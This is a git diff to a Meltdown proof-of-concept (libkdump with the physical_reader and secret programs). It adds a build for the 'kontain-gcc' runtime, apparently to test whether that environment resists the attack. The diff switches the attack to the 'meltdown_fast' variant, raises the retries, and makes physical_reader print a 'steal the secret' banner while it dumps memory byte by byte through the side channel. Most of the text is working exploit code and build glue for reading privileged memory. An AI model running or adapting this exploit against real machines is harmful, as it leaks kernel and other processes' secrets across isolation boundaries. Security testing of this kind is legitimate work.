diff --git a/.gitignore b/.gitignore
index a7e1f07..7af9fde 100644
--- a/.gitignore
+++ b/.gitignore
@@ -8,3 +8,4 @@ test
 *.a
 *.o
 *.so
+*.km
diff --git a/Makefile b/Makefile
index 3933c3a..3bc6bd3 100644
--- a/Makefile
+++ b/Makefile
@@ -1,20 +1,27 @@
-override CFLAGS += -O3 -pthread -Wno-attributes -m64
+override CFLAGS += -O3 -pthread -Wno-attributes -m64 -Ilibkdump
 CC=gcc
+KM_TOP=../../..
 
 #BINARIES=test kaslr physical_reader
 
 SOURCES := $(wildcard *.c)
 BINARIES := $(SOURCES:%.c=%)
+OBJS := $(SOURCES:%.c=%.o)
 
-all: $(BINARIES)
+all: $(BINARIES) physical_reader.km
+
+$(BINARIES): %: %.o libkdump/libkdump.a
+	$(CC) $< -o $@ -m64 -Llibkdump -lkdump -static $(CFLAGS)
 
 libkdump/libkdump.a:  libkdump/libkdump.c
 	make -C libkdump
 
-%: %.c libkdump/libkdump.a
-	$(CC) $< -o $@ -m64 -Llibkdump -Ilibkdump -lkdump -static $(CFLAGS)
-	
+#%: %.o libkdump/libkdump.a
+#	$(CC) $< -o $@ -m64 -Llibkdump -Ilibkdump -lkdump -static $(CFLAGS)
 	
 clean:
-	rm -f *.o $(BINARIES)
+	rm -f *.o $(BINARIES) physical_reader.km
 	make clean -C libkdump
+
+physical_reader.km: physical_reader.o libkdump/libkdump.a
+	$(realpath ${KM_TOP}/tools/bin)/kontain-gcc -pthread $^ -o $@ -l pthread
diff --git a/libkdump/libkdump.c b/libkdump/libkdump.c
index c590391..68df002 100644
--- a/libkdump/libkdump.c
+++ b/libkdump/libkdump.c
@@ -110,7 +110,7 @@ static libkdump_config_t config;
 #endif
 
 #ifndef MELTDOWN
-#define MELTDOWN meltdown_nonull
+#define MELTDOWN meltdown_fast
 #endif
 
 // ---------------------------------------------------------------------------
diff --git a/libkdump/libkdump.h b/libkdump/libkdump.h
index 6147b22..452e027 100644
--- a/libkdump/libkdump.h
+++ b/libkdump/libkdump.h
@@ -114,7 +114,9 @@ size_t libkdump_phys_to_virt(size_t addr);
  */
 void libkdump_enable_debug(int enable);
 
-
+static inline int sched_yield(void) {
+  return 0;
+}
 
 #endif
 
diff --git a/physical_reader.c b/physical_reader.c
index 2388852..a62d945 100644
--- a/physical_reader.c
+++ b/physical_reader.c
@@ -1,6 +1,7 @@
 #include "libkdump.h"
 #include <stdio.h>
 #include <stdlib.h>
+#include <ctype.h>
 
 int main(int argc, char *argv[]) {
   size_t phys;
@@ -16,20 +17,26 @@ int main(int argc, char *argv[]) {
   if (argc > 2) {
     config.physical_offset = strtoull(argv[2], NULL, 0);
   }
-
+  config.retries = 100000;
   libkdump_init(config);
 
   size_t vaddr = libkdump_phys_to_virt(phys);
 
-  printf("\x1b[32;1m[+]\x1b[0m Physical address       : \x1b[33;1m0x%zx\x1b[0m\n", phys);
-  printf("\x1b[32;1m[+]\x1b[0m Physical offset        : \x1b[33;1m0x%zx\x1b[0m\n", config.physical_offset);
-  printf("\x1b[32;1m[+]\x1b[0m Reading virtual address: \x1b[33;1m0x%zx\x1b[0m\n\n", vaddr);
+  printf("\x1b[32;1m[+]\x1b[0m Physical address       : 0x%zx\n", phys);
+  printf("\x1b[32;1m[+]\x1b[0m Physical offset        : 0x%zx\n", config.physical_offset);
+  printf("\x1b[32;1m[+]\x1b[0m Reading virtual address: 0x%zx\n", vaddr);
+
+  printf("\nLets' try to steal the secret\n\n");
 
   while (1) {
-    int value = libkdump_read(vaddr);
-    printf("%c", value);
-    fflush(stdout);
-    vaddr++;
+     int value = libkdump_read(vaddr);
+     if (isprint(value)) {
+        printf("\x1b[31;1;5m%c\x1b[0m", value);
+     } else {
+        printf(".");
+     }
+     fflush(stdout);
+     vaddr++;
   }
 
   libkdump_cleanup();
diff --git a/secret.c b/secret.c
index 773fa51..8764f29 100644
--- a/secret.c
+++ b/secret.c
@@ -24,7 +24,7 @@ int main(int argc, char *argv[]) {
   const char *secret = strings[rand() % (sizeof(strings) / sizeof(strings[0]))];
   int len = strlen(secret);
 
-  printf("\x1b[32;1m[+]\x1b[0m Secret: \x1b[33;1m%s\x1b[0m\n", secret);
+  printf("\x1b[32;1m[+]\x1b[0m Secret: \x1b[31;1m%s\x1b[0m\n", secret);
 
   size_t paddr = libkdump_virt_to_phys((size_t)secret);
   if (!paddr) {
@@ -33,9 +33,11 @@ int main(int argc, char *argv[]) {
     exit(1);
   }
 
-  printf("\x1b[32;1m[+]\x1b[0m Physical address of secret: \x1b[32;1m0x%zx\x1b[0m\n", paddr);
+  printf("\x1b[32;1m[+]\x1b[0m Physical address of secret: 0x%zx\n", paddr);
   printf("\x1b[32;1m[+]\x1b[0m Exit with \x1b[37;1mCtrl+C\x1b[0m if you are done reading the secret\n");
-  while (1) {
+  fflush(stdout);
+  while (1)
+  {
     // keep string cached for better results
     volatile size_t dummy = 0, i;
     for (i = 0; i < len; i++) {
